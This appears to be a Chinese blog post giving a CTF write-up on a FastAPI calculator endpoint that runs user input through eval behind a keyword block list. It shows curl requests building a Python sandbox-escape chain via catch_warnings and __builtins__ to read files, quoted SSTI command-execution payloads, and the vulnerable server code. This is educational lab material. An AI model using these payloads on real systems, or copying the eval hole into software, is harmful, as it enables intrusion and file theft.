---
layout: post
title:  "fastapi伪装下的任意代码执行"
date:   2020-11-11
categories: fastapi rce
---

记录一下之前做的一道签到题，除了签到就啥也不会了：（   
题目的提示只有fastapi，由于没用过fastapi，所以先去查查fastapi的[文档](https://fastapi.tiangolo.com/zh/)   
  
由文档知py版本必须在3.6以上，然后会根据写好的api自动生成一个swagger交互式文档，地址是/docs。  
访问 /docs ，发现一个 /cccalccc 接口，接受post传一个q参数。  

![docs](/note/assets/2020-11-11 19-34-46.png)  

传一个1+1试试
```bash
$ curl -X POST "http://8b8a02fe-84da-4fa8-891c-c7601d2e1e6f.chall.ctf.show/cccalccc" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "q=1%2B1"
{"res":2,"err":false}
```
成功返回2，于是这里盲猜使用了eval函数，伪代码差不多像这样  
```python
def cccalccc():
    return eval(post['q'])
```
尝试读取作用域内的变量
```bash
$ curl -X POST "http://8b8a02fe-84da-4fa8-891c-c7601d2e1e6f.chall.ctf.show/cccalccc" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "q=locals()"|jq
{
  "res": {
    "q": "locals()",
    "hint": "flag is in /mnt/f1a9,try to read it",
    "block_list": [
      "import",
      "open",
      "eval",
      "exec"
    ],
    "keyword": "exec"
  },
  "err": false
}
```
发现一个黑名单，包括4个危险关键字，还有一个hint。到这里就很容易理解出题人的意思了，再盲猜伪代码如下：
```python
def cccalccc():
    text = res['q']
    for black in block_list:
        if black in text:
            return error
    return eval(text)
```
需要绕过黑名单去读取 /mnt/f1a9 文件 。  
这个其实跟模板注入差不多，找到包含黑名单任一关键字函数的变量的属性的链就可以读到文件或rce。   
于是去网上找了找ssti的pop链，找到一个[看着能用的](https://blog.csdn.net/qq_40657585/article/details/83657220)  
```python
{% raw %}
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
{% endraw %}
```
用到了catch_warnings。但是这是模板语句，是不能直接在eval里用的  
改装一下  
先尝试找到catch_warnings
```bash
# [x for x, y in enumerate([].__class__.__base__.__subclasses__()) if y.__name__ == 'catch_warnings']
$ curl -X POST "http://8b8a02fe-84da-4fa8-891c-c7601d2e1e6f.chall.ctf.show/cccalccc" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "q=%5Bx%20for%20x%2C%20y%20in%20enumerate(%5B%5D.__class__.__base__.__subclasses__())%20if%20y.__name__%20%3D%3D%20'catch_warnings'%5D"
{"res":[189],"err":false}
```
发现在第189个属性里，接着找open函数
```bash
# list([].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__'].keys())
$ curl -X POST "http://8b8a02fe-84da-4fa8-891c-c7601d2e1e6f.chall.ctf.show/cccalccc" -H  "accept: application/json" -H  "Content-Type: application/x-www-form-urlencoded" -d "q=list(%5B%5D.__class__.__base__.__subclasses__()%5B189%5D.__init__.__globals__%5B'__builtins__'%5D.keys())"
{"res":["__name__","__doc__","__package__","__loader__","__spec__","__build_class__","__import__","abs","all","any","ascii","bin","breakpoint","callable","chr","compile","delattr","dir","divmod","eval","exec","format","getattr","globals","hasattr","hash","hex","id","input","isinstance","issubclass","iter","len","locals","max","min","next","oct","ord","pow","print","repr","round","setattr","sorted","sum","vars","None","Ellipsis","NotImplemented","False","True","bool","memoryview","bytearray","bytes","classmethod","complex","dict","enumerate","filter","float","frozenset","property","int","list","map","object","range","reversed","set","slice","staticmethod","str","super","tuple","type","zip","__debug__","BaseException","Exception","TypeError","StopAsyncIteration","StopIteration","GeneratorExit","SystemExit","KeyboardInterrupt","ImportError","ModuleNotFoundError","OSError","EnvironmentError","IOError","EOFError","RuntimeError","RecursionError","NotImplementedError","NameError","UnboundLocalError","AttributeError","SyntaxError","IndentationError","TabError","LookupError","IndexError","KeyError","ValueError","UnicodeError","UnicodeEncodeError","UnicodeDecodeError","UnicodeTranslateError","AssertionError","ArithmeticError","FloatingPointError","OverflowError","ZeroDivisionError","SystemError","ReferenceError","MemoryError","BufferError","Warning","UserWarning","DeprecationWarning","PendingDeprecationWarning","SyntaxWarning","RuntimeWarning","FutureWarning","ImportWarning","UnicodeWarning","BytesWarning","ResourceWarning","ConnectionError","BlockingIOError","BrokenPipeError","ChildProcessError","ConnectionAbortedError","ConnectionRefusedError","ConnectionResetError","FileExistsError","FileNotFoundError","IsADirectoryError","NotADirectoryError","InterruptedError","PermissionError","ProcessLookupError","TimeoutError","open","quit","exit","copyright","credits","license","help"],"err":false}
```
发现open函数，但是不能直接通过关键字调用。  
于是找open函数的索引
```bash
# [x for x, y in enumerate([].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__'].keys()) if y.startswith('ope')]
$ curl -X POST "http://8b8a02fe-84da-4fa8-891c-c7601d2e1e6f.chall.ctf.show/cccalccc" -H  "accept: application/json" -H  "Content-Type: application/x-www-form-urlencoded" -d "q=%5Bx%20for%20x%2C%20y%20in%20enumerate(%5B%5D.__class__.__base__.__subclasses__()%5B189%5D.__init__.__globals__%5B'__builtins__'%5D.keys())%20if%20y.startswith('ope')%5D"

{"res":[145],"err":false}
```
找到open函数索引为145。  
于是组装好最终的pop链 读取 /mnt/f1a9 文件：
```bash
# list([].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__'].items())[145][1]('/mnt/f1a9').read()
$ curl -X POST "http://8b8a02fe-84da-4fa8-891c-c7601d2e1e6f.chall.ctf.show/cccalccc" -H  "accept: application/json" -H  "Content-Type: application/x-www-form-urlencoded" -d "q=list(%5B%5D.__class__.__base__.__subclasses__()%5B189%5D.__init__.__globals__%5B'__builtins__'%5D.items())%5B145%5D%5B1%5D('%2Fmnt%2Ff1a9').read()"
{"res":"flag{d41b8452-418b-4af1-b0d2-e0b93f27d751}\n","err":false}
```
OK，成功读到flag ！   

   
最后再尝试读取服务端代码，验证下盲猜的伪代码对不对
```bash
# list([].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__'].items())[145][1]('main.py').read()
$ curl -X POST "http://8b8a02fe-84da-4fa8-891c-c7601d2e1e6f.chall.ctf.show/cccalccc" -H  "accept: application/json" -H  "Content-Type: application/x-www-form-urlencoded" -d "q=list(%5B%5D.__class__.__base__.__subclasses__()%5B189%5D.__init__.__globals__%5B'__builtins__'%5D.items())%5B145%5D%5B1%5D('main.py').read()"
{"res":"from typing import Optional\nfrom fastapi import FastAPI,Form\nimport uvicorn\n\napp = FastAPI()\n\n@app.get(\"/\")\ndef hello():\n    return {\"hello\": \"fastapi\"}\n\n@app.post(\"/cccalccc\",description=\"安全的计算器\")\ndef calc(q: Optional[str] = Form(...)):\n    try:\n        hint = \"flag is in /mnt/f1a9,try to read it\"\n        block_list = ['import','open','eval','exec']\n        for keyword in block_list:\n            if keyword in q:\n                return {\"res\": \"hack out!\", \"err\": False}\n        return {\"res\": eval(q), \"err\": False}\n    except:\n        return {\"res\": \"\", \"err\": True}\n\nif __name__ == '__main__':\n    uvicorn.run(app=app, host=\"0.0.0.0\", port=8000, workers=1)\n","err":false}
```
正常打印出来就是这样
```python
from typing import Optional
from fastapi import FastAPI,Form
import uvicorn

app = FastAPI()

@app.get("/")
def hello():
    return {"hello": "fastapi"}

@app.post("/cccalccc",description="安全的计算器")
def calc(q: Optional[str] = Form(...)):
    try:
        hint = "flag is in /mnt/f1a9,try to read it"
        block_list = ['import','open','eval','exec']
        for keyword in block_list:
            if keyword in q:
                return {"res": "hack out!", "err": False}
        return {"res": eval(q), "err": False}
    except:
        return {"res": "", "err": True}

if __name__ == '__main__':
    uvicorn.run(app=app, host="0.0.0.0", port=8000, workers=1)
```
哈哈哈，看来盲猜是对的
